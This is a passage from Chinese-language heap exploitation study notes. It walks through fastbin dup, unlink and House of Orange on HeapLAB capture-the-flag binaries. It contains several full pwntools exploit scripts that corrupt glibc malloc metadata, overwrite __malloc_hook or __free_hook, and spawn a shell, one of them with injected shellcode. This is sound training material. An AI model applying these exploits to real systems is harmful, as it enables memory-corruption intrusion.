<pre><code class="python"># Request two 0x30-sized chunks and fill them with data.
chunk_A = malloc(0x68, b&quot;A&quot;*0x28)
chunk_B = malloc(0x68, b&quot;B&quot;*0x28)

# Free the first chunk, then the second.
free(chunk_A)
free(chunk_B)
free(chunk_A)

# modify fd
malloc(0x68, p64(libc.sym.__malloc_hook - 35))
</code></pre>
</li>
<li><p>填充0x13的垃圾数据，接着填入one_gadget的地址。</p>
<pre><code class="python"># malloc twice
malloc(0x68, b&#39;0&#39;)
malloc(0x68, b&#39;1&#39;)

# malloc fake chunk
# if no limit malloc&#39;s count
# malloc(0x68, p8(0)*0x13+p64(libc.sym.system))
# sh_addr = p64(next(libc.search(b&#39;/bin/sh\x00&#39;)))

# malloc(sh_addr, b&quot;&quot;)
one = [0xc4dbf, 0xc4de6, 0xe1fa1]
malloc(0x68, p8(0)*0x13+p64(libc.address + one[2]))
malloc(0x10, b&#39;&#39;)
</code></pre>
</li>
<li><p>drop shell</p>
<p><img src="Heap.assets/image-20220820184826255.png" alt="image-20220820184826255"></p>
</li>
</ul>
<h5 id="exp-》drop-shell"><a href="#exp-》drop-shell" class="headerlink" title="exp-》drop shell"></a>exp-》drop shell</h5><pre><code class="python">#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF(&quot;fastbin_dup&quot;)
libc = ELF(elf.runpath + b&quot;/libc.so.6&quot;) # elf.libc broke again

gs = &#39;&#39;&#39;
continue
&#39;&#39;&#39;
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the &quot;malloc&quot; option; send size &amp; data.
# Returns chunk index.
def malloc(size, data):
    global index
    io.send(b&quot;1&quot;)
    io.sendafter(b&quot;size: &quot;, f&quot;{size}&quot;.encode())
    io.sendafter(b&quot;data: &quot;, data)
    io.recvuntil(b&quot;&gt; &quot;)
    index += 1
    return index - 1

# Select the &quot;free&quot; option; send index.
def free(index):
    io.send(b&quot;2&quot;)
    io.sendafter(b&quot;index: &quot;, f&quot;{index}&quot;.encode())
    io.recvuntil(b&quot;&gt; &quot;)

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b&quot;puts() @ &quot;)
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.timeout = 0.1

# =============================================================================

# =-=-=- EXAMPLE -=-=-=

# Set the username field.
username = b&quot;ferity-fan&quot;
io.sendafter(b&quot;username: &quot;, username)
io.recvuntil(b&quot;&gt; &quot;)

# Request two 0x30-sized chunks and fill them with data.
chunk_A = malloc(0x68, b&quot;A&quot;*0x28)
chunk_B = malloc(0x68, b&quot;B&quot;*0x28)

# Free the first chunk, then the second.
free(chunk_A)
free(chunk_B)
free(chunk_A)

# modify fd
malloc(0x68, p64(libc.sym.__malloc_hook - 35))

# malloc twice
malloc(0x68, b&#39;0&#39;)
malloc(0x68, b&#39;1&#39;)

# malloc fake chunk
# if no limit malloc&#39;s count
# malloc(0x68, p8(0)*0x13+p64(libc.sym.system))
# sh_addr = p64(next(libc.search(b&#39;/bin/sh\x00&#39;)))

# malloc(sh_addr, b&quot;&quot;)
one = [0xc4dbf, 0xc4de6, 0xe1fa1]
malloc(0x68, p8(0)*0x13+p64(libc.address + one[2]))
malloc(0x10, b&#39;&#39;)
# =============================================================================

io.interactive()
</code></pre>
<h4 id="示例二：fastbin-dup-2"><a href="#示例二：fastbin-dup-2" class="headerlink" title="示例二：fastbin_dup_2"></a>示例二：fastbin_dup_2</h4><blockquote>
<p>文件详见附件 <a href="attachment/fastbin_dup_2/fastbin_dup_2">fastbin_dup_2</a></p>
</blockquote>
<h5 id="检查安全措施-3"><a href="#检查安全措施-3" class="headerlink" title="检查安全措施"></a>检查安全措施</h5><pre><code class="sh">┌──(fanya㉿ferity)-[~/…/heap/heaplab/part1/challenge-fastbin_dup]
└─$ checksec fastbin_dup_2 
[*] &#39;/home/fanya/Desktop/heap/heaplab/part1/challenge-fastbin_dup/fastbin_dup_2&#39;
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  &#39;../.glibc/glibc_2.30_no-tcache&#39;
</code></pre>
<h5 id="程序分析-3"><a href="#程序分析-3" class="headerlink" title="程序分析"></a>程序分析</h5><p>没有限制double free，但此时的chunk申请不了0x68的大小也就意味着我们不能直接利用那个<code>__malloc_hook - 35</code>的位置了。但是我们知道<code>main_arena</code>上存着各种fastbin的fd指针，可以使用两次fastbin dup，一次用来写 size字段，一次用来写fd字段，此时的fd字段是main_arena上的某个位置（要与伪造的size相对应），接着malloc来覆盖至top_chunk的地址，修改至<code>__malloc_hook - 35 </code>的位置，此时继续malloc适当的大小即可覆盖至<code>__malloc_hook</code>，将其覆盖为one_gadget的地址。但是我们发现此时的寄存器状态并不满足任何一个one_gadget所需要的条件，不过经我们调试发现相应的位置存着是我们之前输入的值，将其修改为<code>-s\x00</code>即可。</p>
<pre><code class="c">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  unsigned __int64 num; // rax
  unsigned int index; // [rsp+14h] [rbp-7Ch]
  size_t n; // [rsp+18h] [rbp-78h]
  unsigned __int64 na; // [rsp+18h] [rbp-78h]
  char *m_array[13]; // [rsp+20h] [rbp-70h] BYREF
  unsigned __int64 v8; // [rsp+88h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts(&quot;\n===============&quot;);
  puts(&quot;|   HeapLAB   |  CHALLENGE: Fastbin Dup&quot;);
  puts(&quot;===============\n&quot;);
  printf(&quot;puts() @ %p\n&quot;, &amp;puts);
  memset(m_array, 0, sizeof(m_array));
  index = 0;
  while ( 1 )
  {
    while ( 1 )
    {
      printf(&quot;\n1) malloc %u/%u\n&quot;, index, 13LL);
      puts(&quot;2) free&quot;);
      puts(&quot;3) quit&quot;);
      printf(&quot;&gt; &quot;);
      num = read_num();
      if ( num != 2 )
        break;
      printf(&quot;index: &quot;);
      na = read_num();
      if ( na &gt;= index )
        puts(&quot;invalid index&quot;);
      else
        free(m_array[na]);
    }
    if ( num == 3 )
      break;
    if ( num == 1 )
    {
      if ( index &gt; 0xC )
      {
        puts(&quot;maximum requests reached&quot;);
      }
      else
      {
        printf(&quot;size: &quot;);
        n = read_num();
        if ( n &gt; 0x58 &amp;&amp; (n &lt;= 0x68 || n &gt; 0x78) )
        {
          puts(&quot;fast chunks only (excluding 0x70)&quot;);
        }
        else
        {
          m_array[index] = (char *)malloc(n);
          if ( m_array[index] )
          {
            printf(&quot;data: &quot;);
            read(0, m_array[index++], n);
          }
          else
          {
            puts(&quot;request failed&quot;);
          }
        }
      }
    }
  }
  exit(0);
}
</code></pre>
<h5 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><ul>
<li><p>两次fastbin dup，伪造一个size字段以及一个fd字段</p>
<p><img src="Heap.assets/image-20220821113749445.png" alt="image-20220821113749445"></p>
</li>
<li><p>继续malloc，将top chunk的地址覆盖，为了方便观看我们将其修改为0xdeadbeef</p>
<p><img src="Heap.assets/image-20220821114003739.png" alt="image-20220821114003739"></p>
<p>为了满足一个对size字段的检查，我们还是用<code>__malloc_hook - 35</code>来覆盖top_chunk的地址。</p>
<pre><code class="c">--- a/malloc/malloc.c
+++ b/malloc/malloc.c
@@ -4076,6 +4076,9 @@ _int_malloc (mstate av, size_t bytes)
       victim = av-&gt;top;
       size = chunksize (victim);
 
+      if (__glibc_unlikely (size &gt; av-&gt;system_mem))
+        malloc_printerr (&quot;malloc(): corrupted top size&quot;);
+
       if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE))
         {
           remainder_size = size - nb;
</code></pre>
</li>
<li><p>继续malloc，使用one_gadget来覆盖<code>__malloc_hook</code>，为了方便观察，我们仍然使用0xdeadbeef来代替</p>
<p><img src="Heap.assets/image-20220821115406447.png" alt="image-20220821115406447"></p>
<p>继续malloc，观察是否满足one_gadget的条件</p>
<p><img src="Heap.assets/image-20220821115524129.png" alt="image-20220821115524129"></p>
<p>此时的寄存器状态</p>
<p><img src="Heap.assets/image-20220821115602029.png" alt="image-20220821115602029"></p>
<p>此时的栈帧状态</p>
<p><img src="Heap.assets/image-20220821115655834.png" alt="stck"></p>
<p>可以观察到并不满足任何一个one_gadget的地址，但是我们看到第三个one_gadget，只要求rsp+0x50的位置所存的值为0即可，此时的值我们发现是可以有我们自己控制的，遂修改即可。</p>
</li>
<li><p>drop a shell</p>
<p><img src="Heap.assets/image-20220821120333916.png" alt="image-20220821120333916"></p>
</li>
</ul>
<h5 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h5><pre><code class="python">#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF(&quot;fastbin_dup_2&quot;)
libc = ELF(elf.runpath + b&quot;/libc.so.6&quot;) # elf.libc broke again

gs = &#39;&#39;&#39;
continue
&#39;&#39;&#39;
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the &quot;malloc&quot; option; send size &amp; data.
# Returns chunk index.
def malloc(size, data):
    global index
    io.send(b&quot;1&quot;)
    io.sendafter(b&quot;size: &quot;, f&quot;{size}&quot;.encode())
    io.sendafter(b&quot;data: &quot;, data)
    io.recvuntil(b&quot;&gt; &quot;)
    index += 1
    return index - 1

# Select the &quot;free&quot; option; send index.
def free(index):
    io.send(b&quot;2&quot;)
    io.sendafter(b&quot;index: &quot;, f&quot;{index}&quot;.encode())
    io.recvuntil(b&quot;&gt; &quot;)

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b&quot;puts() @ &quot;)
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.timeout = 0.1

# =============================================================================

# =-=-=- EXAMPLE -=-=-=

# Request two 0x50-sized chunks.
chunk_A = malloc(0x48, b&quot;A&quot;*8)
chunk_B = malloc(0x48, b&quot;B&quot;*8)

# Free the first chunk, then the second.
free(chunk_A)
free(chunk_B)
free(chunk_A)

malloc(0x48, p64(0x61))
malloc(0x48, b&quot;C&quot;*0x48)
malloc(0x48, b&quot;D&quot;*0x48)

# other fastbin dup
chunk_E = malloc(0x58, b&quot;E&quot;*0x58)
chunk_F = malloc(0x58, b&quot;F&quot;*0x58)

free(chunk_E)
free(chunk_F)
free(chunk_E)

malloc(0x58, p64(libc.sym.main_arena + 0x20))
# malloc(0x58, b&quot;G&quot;*0x58)
malloc(0x58, b&quot;-s\x00&quot;)
malloc(0x58, b&quot;H&quot;*0x58)

# over_write the top_chunk
malloc(0x58, b&quot;Y&quot;*0x30 + p64(libc.sym.__malloc_hook - 35))
# malloc(0x58, b&quot;Y&quot;*0x30 + p64(0xdeadbeef))

# malloc fake chunk
malloc(0x28, b&quot;Z&quot;*0x13 + p64(libc.address + 0xe1fa1))
# malloc(0x28, b&quot;Z&quot;*0x13 + p64(0xdeadbeef))

# drop a shell
malloc(0x10, b&quot;&quot;)

# =============================================================================
io.interactive()                
</code></pre>
<h4 id="示例三：0CTF-2017-babyheap"><a href="#示例三：0CTF-2017-babyheap" class="headerlink" title="示例三：0CTF 2017 babyheap"></a>示例三：0CTF 2017 babyheap</h4><blockquote>
<p>文件详见<a href="attachment%5C0ctf_2017_babyheap%5Cbabyheap">babyheap</a></p>
</blockquote>
<h3 id="Unlink-old"><a href="#Unlink-old" class="headerlink" title="Unlink(old)"></a>Unlink(<del>old</del>)</h3><h4 id="详情-2"><a href="#详情-2" class="headerlink" title="详情"></a>详情</h4><p>为了避免堆内存过度碎片化，当一个堆块（fastbin chunk 除外）被释放时，libc会查看其前后堆块是否处于被释放的状态，如果是，就将前面或后面的堆块中从bins中取出，并于当前堆块合并，这个取出的过程便是unlink。</p>
<p>假设我们此时开辟了6个大小为0xa0的堆块：<img src="Heap.assets/image-20220903173420886.png" alt="image-20220903173420886"></p>
<p>此时我们释放靠近top chunk的堆块，我们会发现该堆块会和top chunk合并<img src="Heap.assets/image-20220903173447945.png" alt="image-20220903173447945"></p>
<p>此时我们释放第一个申请的块，我们可以看到这个块已被放入了unsortedbin，且fd,bk指针均被赋值，下一个chunk的prev_size及prev_inuse均有改变<img src="Heap.assets/image-20220903173735492.png" alt="image-20220903173735492"></p>
<p>此时我们再去释放临近块，我们会发现两个chunk合并成立一个chunk。</p>
<p><img src="Heap.assets/image-20220903174353252.png" alt="image-20220903174353252"></p>
<p><img src="Heap.assets/image-20220903175411826.png" alt="image-20220903175411826"></p>
<p>在这个unlink的过程中存在着一个fd,bk的反射写入，我们此漏洞的利用同样也是根据于此：</p>
<ul>
<li><p>我们先创建5个大小为0x90的堆块：<img src="Heap.assets/image-20220903181246083.png" alt="image-20220903181246083"></p>
</li>
<li><p>接着我们利用堆溢出来修改第三个堆块的fd, bk以及第四个堆块的prev_size，prev_inuse:<img src="Heap.assets/image-20220903182117957.png" alt="image-20220903182117957"></p>
</li>
<li><p>我们继续释放第四个块，此时第四个块的prev_inuse为0，也就意味着这个堆块会向前合并。</p>
<p><img src="Heap.assets/image-20220903182811281.png" alt="image-20220903182811281"></p>
</li>
</ul>
<p>unsafe unlink 相应代码如下：</p>
<pre><code class="c">#define unlink(AV, P, BK, FD) {\
    FD = P-&gt;fd;\
    BK = P-&gt;bk;\
    FD-&gt;bk = BK;\
    BK-&gt;fd = FD;\
    if (!in_smallbin_range (P-&gt;size)\
        &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) {\
            if (FD-&gt;fd_nextsize == NULL) {\
                if (P-&gt;fd_nextsize == P)\
                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;\
                else {\
                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;\
                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;\
                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;\
                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;\
                }\
            } else {\
                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;\
                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;\
            }\
    }\
}
</code></pre>
<h4 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h4><p>这项技术只能在GLIBC版本&lt;=2.3.3的情况下使用，safe unlink  是在2004年GLIBC版本2.3.4中引入的，而GLIBC版本如此之老并不常见。这项技术最初是用来对付没有NX/DEP的平台的，这里也是这样描述的。2003年，AMD在他们的消费者桌面处理器中引入了硬件NX支持，随后英特尔在2004年也引入了，因此没有这种保护的系统并不常见。</p>
<h4 id="示例一-unsafe-unlink"><a href="#示例一-unsafe-unlink" class="headerlink" title="示例一 unsafe_unlink"></a>示例一 unsafe_unlink</h4><blockquote>
<p>文件详见 <a href="attachment/unsafe_unlink/unsafe_unlink">unsafe_unlink</a></p>
</blockquote>
<h5 id="检查保护措施"><a href="#检查保护措施" class="headerlink" title="检查保护措施"></a>检查保护措施</h5><pre><code class="bash">┌──(fanya㉿ferity)-[~/…/heap/heaplab/part1/unsafe_unlink]
└─$ checksec unsafe_unlink
[*] &#39;/home/fanya/Desktop/heap/heaplab/part1/unsafe_unlink/unsafe_unlink&#39;
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
    RUNPATH:  &#39;../.glibc/glibc_2.23_unsafe-unlink&#39;
</code></pre>
<h5 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><ul>
<li><p>由于是古老时代的unlink，没有基于fd，及bk的安全检查，利用unlink的反射写入来修改<code>__free_hook</code>，从而执行shellcode</p>
<p><img src="Heap.assets/image-20220916151609194.png" alt="image-20220916151609194"></p>
</li>
</ul>
<h5 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h5><pre><code class="python">#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF(&quot;unsafe_unlink&quot;)
libc = ELF(elf.runpath + b&quot;/libc.so.6&quot;) # elf.libc broke again

gs = &#39;&#39;&#39;
continue
&#39;&#39;&#39;
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the &quot;malloc&quot; option; send size.
# Returns chunk index.
def malloc(size):
    global index
    io.send(b&quot;1&quot;)
    io.sendafter(b&quot;size: &quot;, f&quot;{size}&quot;.encode())
    io.recvuntil(b&quot;&gt; &quot;)
    index += 1
    return index - 1

# Select the &quot;edit&quot; option; send index &amp; data.
def edit(index, data):
    io.send(b&quot;2&quot;)
    io.sendafter(b&quot;index: &quot;, f&quot;{index}&quot;.encode())
    io.sendafter(b&quot;data: &quot;, data)
    io.recvuntil(b&quot;&gt; &quot;)

# Select the &quot;free&quot; option; send index.
def free(index):
    io.send(b&quot;3&quot;)
    io.sendafter(b&quot;index: &quot;, f&quot;{index}&quot;.encode())
    io.recvuntil(b&quot;&gt; &quot;)

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b&quot;puts() @ &quot;)
libc.address = int(io.recvline(), 16) - libc.sym.puts

# This binary leaks the heap start address.
io.recvuntil(b&quot;heap @ &quot;)
heap = int(io.recvline(), 16)
io.recvuntil(b&quot;&gt; &quot;)
io.timeout = 0.1

# =============================================================================

# Prepare execve(&quot;/bin/sh&quot;) shellcode with a jmp over where the fd will be written.
shellcode = asm(&quot;jmp shellcode;&quot; + &quot;nop;&quot;*0x16 + &quot;shellcode:&quot; + shellcraft.execve(&quot;/bin/sh&quot;))

chunk_A = malloc(0x88)
chunk_B = malloc(0x88)

fd = libc.sym.__free_hook - 0x18
bk = heap + 0x20

edit(chunk_A, pack(fd) + pack(bk) + shellcode.ljust(0x70, b&#39;\x00&#39;) + p64(0x90)*2)
free(chunk_B)
free(chunk_A)

# =============================================================================

io.interactive()
</code></pre>
<h3 id="Unlink-new"><a href="#Unlink-new" class="headerlink" title="Unlink(new)"></a>Unlink(<del>new</del>)</h3><h4 id="详情-3"><a href="#详情-3" class="headerlink" title="详情"></a>详情</h4><p><img src="Heap.assets/image-20220916180441088.png" alt="image-20220916180441088"></p>
<pre><code class="c">/* Take a chunk off a bin list.  */
static void
unlink_chunk (mstate av, mchunkptr p)
{
  if (chunksize (p) != prev_size (next_chunk (p)))
    malloc_printerr (&quot;corrupted size vs. prev_size&quot;);

  mchunkptr fd = p-&gt;fd;
  mchunkptr bk = p-&gt;bk;

  if (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, 0))
    malloc_printerr (&quot;corrupted double-linked list&quot;);

  fd-&gt;bk = bk;
  bk-&gt;fd = fd;
  if (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != NULL)
    {
      if (p-&gt;fd_nextsize-&gt;bk_nextsize != p
      || p-&gt;bk_nextsize-&gt;fd_nextsize != p)
    malloc_printerr (&quot;corrupted double-linked list (not small)&quot;);

      if (fd-&gt;fd_nextsize == NULL)
    {
      if (p-&gt;fd_nextsize == p)
        fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;
      else
        {
          fd-&gt;fd_nextsize = p-&gt;fd_nextsize;
          fd-&gt;bk_nextsize = p-&gt;bk_nextsize;
          p-&gt;fd_nextsize-&gt;bk_nextsize = fd;
          p-&gt;bk_nextsize-&gt;fd_nextsize = fd;
        }
    }
      else
    {
      p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;
      p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;
    }
    }
}
</code></pre>
<h4 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h4><p>伪造一个假的chunk，从合法chunk的用户数据的第一个四字开始，将其fd和bk分别指向用 户数据指针之前的0x18和0x10字节，它们位于该chunk中。为后续的数据块设计一个prev_size 字段，比前一个数据块的实际大小少0x10字节。利用一个溢出错误来清除后继块的prev_inuse位，当这个块被释放时，malloc将试图把它与假的块向后合并。假的块的fd所指向的块的bk指向假的块，而假的块的bk所指向的块的fd也指向假的块，满足了safe link的检查。解除链接过程的结果是，假块的指针（指向合法块的用户数据的指针）被覆盖为自身的地址减去0x18。</p>
<p><img src="Heap.assets/image-20220916182208311.png" alt="image-20220916182208311"></p>
<h4 id="示例一-safe-unlink"><a href="#示例一-safe-unlink" class="headerlink" title="示例一  safe unlink"></a>示例一  safe unlink</h4><blockquote>
<p>文件详见<a href="attachment/safe_unlink/safe_unlink">safe_unlink</a></p>
</blockquote>
<h5 id="检查保护措施-1"><a href="#检查保护措施-1" class="headerlink" title="检查保护措施"></a>检查保护措施</h5><pre><code class="shell">┌──(fanya㉿ferity)-[~/…/heap/heaplab/part1/safe_unlink]
└─$ checksec safe_unlink
[*] &#39;/home/fanya/Desktop/heap/heaplab/part1/safe_unlink/safe_unlink&#39;
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  &#39;../.glibc/glibc_2.30_no-tcache&#39;
</code></pre>
<h5 id="漏洞利用-4"><a href="#漏洞利用-4" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><ul>
<li>因为存在一个<code>m_array</code>来储存所申请的chunk，从而方便unlink的利用，从而修改<code>__free_hook</code>。</li>
</ul>
<h5 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h5><pre><code class="python">#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF(&quot;safe_unlink&quot;)
libc = ELF(elf.runpath + b&quot;/libc.so.6&quot;) # elf.libc broke again

gs = &#39;&#39;&#39;
continue
&#39;&#39;&#39;
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the &quot;malloc&quot; option; send size.
# Returns chunk index.
def malloc(size):
    global index
    io.send(b&quot;1&quot;)
    io.sendafter(b&quot;size: &quot;, f&quot;{size}&quot;.encode())
    io.recvuntil(b&quot;&gt; &quot;)
    index += 1
    return index - 1

# Select the &quot;edit&quot; option; send index &amp; data.
def edit(index, data):
    io.send(b&quot;2&quot;)
    io.sendafter(b&quot;index: &quot;, f&quot;{index}&quot;.encode())
    io.sendafter(b&quot;data: &quot;, data)
    io.recvuntil(b&quot;&gt; &quot;)

# Select the &quot;free&quot; option; send index.
def free(index):
    io.send(b&quot;3&quot;)
    io.sendafter(b&quot;index: &quot;, f&quot;{index}&quot;.encode())
    io.recvuntil(b&quot;&gt; &quot;)

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b&quot;puts() @ &quot;)
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.recvuntil(b&quot;&gt; &quot;)
io.timeout = 0.1

# =============================================================================

# =-=-=- EXAMPLE -=-=-=

info(f&quot;m_array @ 0x{elf.sym.m_array:02x}&quot;)

# Request 2 small chunks.
chunk_A = malloc(0x88)
chunk_B = malloc(0x88)

# pause()
# Prepare fake chunk metadata.
fd = elf.sym.m_array - 0x18
bk = elf.sym.m_array - 0x10
prev_size = 0x80
fake_size = 0x90
edit(chunk_A, p64(0) + p64(0x80) + p64(fd) + p64(bk) + p8(0)*0x60 + p64(prev_size) + p64(fake_size))

# pause()
free(chunk_B)

edit(chunk_A, p64(0)*3 + p64(libc.sym.__free_hook - 0x8))
edit(chunk_A, b&#39;/bin/sh\x00&#39; + p64(libc.sym.system ))
free(chunk_A)


# =============================================================================

io.interactive()
</code></pre>
<h3 id="Unsortedbin-Attack"><a href="#Unsortedbin-Attack" class="headerlink" title="Unsortedbin Attack"></a>Unsortedbin Attack</h3><p><img src="Heap.assets/image-20220929171044220.png" alt="image-20220929171044220"></p>
<h3 id="House-of-Orange"><a href="#House-of-Orange" class="headerlink" title="House of Orange"></a>House of Orange</h3><pre><code class="c">struct _IO_FILE {
  int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */
#define _IO_file_flags _flags

  /* The following pointers correspond to the C++ streambuf protocol. */
  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
  char* _IO_read_ptr;   /* Current read pointer */
  char* _IO_read_end;   /* End of get area. */
  char* _IO_read_base;  /* Start of putback+get area. */
  char* _IO_write_base; /* Start of put area. */
  char* _IO_write_ptr;  /* Current put pointer. */
  char* _IO_write_end;  /* End of put area. */
  char* _IO_buf_base;   /* Start of reserve area. */
  char* _IO_buf_end;    /* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
#if 0
  int _blksize;
#else
  int _flags2;
#endif
  _IO_off_t _old_offset; /* This used to be _offset but it&#39;s too small.  */

#define __HAVE_COLUMN /* temporary */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  /*  char* _save_gptr;  char* _save_egptr; */

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
struct _IO_FILE_complete
{
  struct _IO_FILE _file;
#endif
#if defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001
  _IO_off64_t _offset;
# if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
  /* Wide character stream stuff.  */
  struct _IO_codecvt *_codecvt;
  struct _IO_wide_data *_wide_data;
  struct _IO_FILE *_freeres_list;
  void *_freeres_buf;
# else
  void *__pad1;
  void *__pad2;
  void *__pad3;
  void *__pad4;

  size_t __pad5;
  int _mode;
  /* Make sure we don&#39;t get into trouble again.  */
  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];
#endif
};
</code></pre>
<pre><code class="c">pwndbg&gt;  ptype /o FILE
pwndbg&gt;  ptype /o struct _IO_FILE  
/* offset    |  size */  type = struct _IO_FILE {
/*    0      |     4 */    int _flags;
/* XXX  4-byte hole  */
/*    8      |     8 */    char *_IO_read_ptr;
/*   16      |     8 */    char *_IO_read_end;
/*   24      |     8 */    char *_IO_read_base;
/*   32      |     8 */    char *_IO_write_base;
/*   40      |     8 */    char *_IO_write_ptr;
/*   48      |     8 */    char *_IO_write_end;
/*   56      |     8 */    char *_IO_buf_base;
/*   64      |     8 */    char *_IO_buf_end;
/*   72      |     8 */    char *_IO_save_base;
/*   80      |     8 */    char *_IO_backup_base;
/*   88      |     8 */    char *_IO_save_end;
/*   96      |     8 */    struct _IO_marker *_markers;
/*  104      |     8 */    struct _IO_FILE *_chain;
/*  112      |     4 */    int _fileno;
/*  116      |     4 */    int _flags2;
/*  120      |     8 */    __off_t _old_offset;
/*  128      |     2 */    unsigned short _cur_column;
/*  130      |     1 */    signed char _vtable_offset;
/*  131      |     1 */    char _shortbuf[1];
/* XXX  4-byte hole  */
/*  136      |     8 */    _IO_lock_t *_lock;
/*  144      |     8 */    __off64_t _offset;
/*  152      |     8 */    struct _IO_codecvt *_codecvt;
/*  160      |     8 */    struct _IO_wide_data *_wide_data;
/*  168      |     8 */    struct _IO_FILE *_freeres_list;
/*  176      |     8 */    void *_freeres_buf;
/*  184      |     8 */    size_t __pad5;
/*  192      |     4 */    int _mode;
/*  196      |    20 */    char _unused2[20];

                           /* total size (bytes):  216 */
                         }
</code></pre>
<pre><code class="c">pwndbg&gt; dt &quot;struct _IO_FILE&quot;
pwndbg&gt; dt  FILE
FILE
    +0x0000 _flags               : int
    +0x0008 _IO_read_ptr         : char *
    +0x0010 _IO_read_end         : char *
    +0x0018 _IO_read_base        : char *
    +0x0020 _IO_write_base       : char *
    +0x0028 _IO_write_ptr        : char *
    +0x0030 _IO_write_end        : char *
    +0x0038 _IO_buf_base         : char *
    +0x0040 _IO_buf_end          : char *
    +0x0048 _IO_save_base        : char *
    +0x0050 _IO_backup_base      : char *
    +0x0058 _IO_save_end         : char *
    +0x0060 _markers             : struct _IO_marker *
    +0x0068 _chain               : struct _IO_FILE *
    +0x0070 _fileno              : int
    +0x0074 _flags2              : int
    +0x0078 _old_offset          : __off_t
    +0x0080 _cur_column          : short unsigned int
    +0x0082 _vtable_offset       : signed char
    +0x0083 _shortbuf            : char [1]
    +0x0088 _lock                : _IO_lock_t *
    +0x0090 _offset              : __off64_t
    +0x0098 _codecvt             : struct _IO_codecvt *
    +0x00a0 _wide_data           : struct _IO_wide_data *
    +0x00a8 _freeres_list        : struct _IO_FILE *
    +0x00b0 _freeres_buf         : void *
    +0x00b8 __pad5               : size_t
    +0x00c0 _mode                : int
    +0x00c4 _unused2             : char [20]
</code></pre>
<pre><code class="c">pwndbg&gt; p _IO_list_all
$2 = (struct _IO_FILE_plus *) 0x7ffff7f775c0 &lt;_IO_2_1_stderr_&gt;
pwndbg&gt; dt &quot;struct _IO_FILE_plus&quot;
struct _IO_FILE_plus
    +0x0000 file                 : FILE
    +0x00d8 vtable               : const struct _IO_jump_t *
</code></pre>
<pre><code class="c">pwndbg&gt; dt &quot;struct _IO_jump_t&quot;
struct _IO_jump_t
    +0x0000 __dummy              : size_t
    +0x0008 __dummy2             : size_t
    +0x0010 __finish             : _IO_finish_t
    +0x0018 __overflow           : _IO_overflow_t
    +0x0020 __underflow          : _IO_underflow_t
    +0x0028 __uflow              : _IO_underflow_t
    +0x0030 __pbackfail          : _IO_pbackfail_t
    +0x0038 __xsputn             : _IO_xsputn_t
    +0x0040 __xsgetn             : _IO_xsgetn_t
    +0x0048 __seekoff            : _IO_seekoff_t
